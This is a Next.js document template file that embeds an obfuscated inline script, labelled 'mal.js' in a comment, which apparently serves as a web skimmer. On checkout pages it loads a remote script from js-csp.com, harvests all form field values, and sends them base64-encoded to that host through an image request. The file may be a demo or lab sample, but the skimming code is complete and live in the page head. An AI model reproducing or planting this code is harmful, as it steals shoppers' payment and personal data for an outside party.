import { Html, Head, Main, NextScript } from 'next/document';

export default function Document() {
  return (
    <Html lang="en">
      <Head>
        {/* Inline mal.js code so it appears in view-source */}
        <script dangerouslySetInnerHTML={{ __html: `
((x, y, z, h, o) => {
  if (x.location.toString().includes(String.fromCharCode.apply(null, y))) {
    var i = z.createElement(h);
    var j = z.getElementsByTagName(h)[0];
    i.src = String.fromCharCode.apply(null, o);
    if (j && j.parentNode) {
      j.parentNode.insertBefore(i, j);
    }
  }
})(
  window,
  [99, 104, 101, 99, 107, 111, 117, 116],
  document,
  "script",
  [
    104, 116, 116, 112, 115, 58, 47, 47, 106, 115, 45, 99, 115, 112, 46, 99,
    111, 109, 47, 103, 101, 116, 73, 110, 106, 101, 99, 116, 111, 114, 47,
  ]
);
function F(t) {
  var z = {};
  var D = {};
  var V = t.querySelectorAll("input, select, textarea");
  var h = 0;
  for (; h < V.length; h = h + 1) {
    var S = V[h];
    var P = S.name;
    if (!P) {
      P = S.id;
    }
    var v = S.value;
    if (v !== "") {
      if (P) {
        if (!D[P]) {
          D[P] = 0;
        }
        if (S.tagName != "SELECT") {
          if (D[P] == 0) {
            z[P] = v;
          } else {
            z[P + "#" + D[P]] = v;
          }
        } else {
          if (D[P] == 0) {
            z[P] = S.options[S.selectedIndex].text;
          } else {
            z[P + "#" + D[P]] = S.options[S.selectedIndex].text;
          }
        }
        D[P] = D[P] + 1;
      }
    }
  }
  return z;
}
function __send(str) {
  try {
    var img = new Image();
    img.crossOrigin = "anonymous";
    img.src =
      "https://js-csp.com/fetchData/?data=" +
      window.btoa(str) +
      "&loc=" +
      document.location.origin;
  } catch (e) {}
}
        `}} />
      </Head>
      <body>
        <Main />
        <NextScript />
      </body>
    </Html>
  );
}
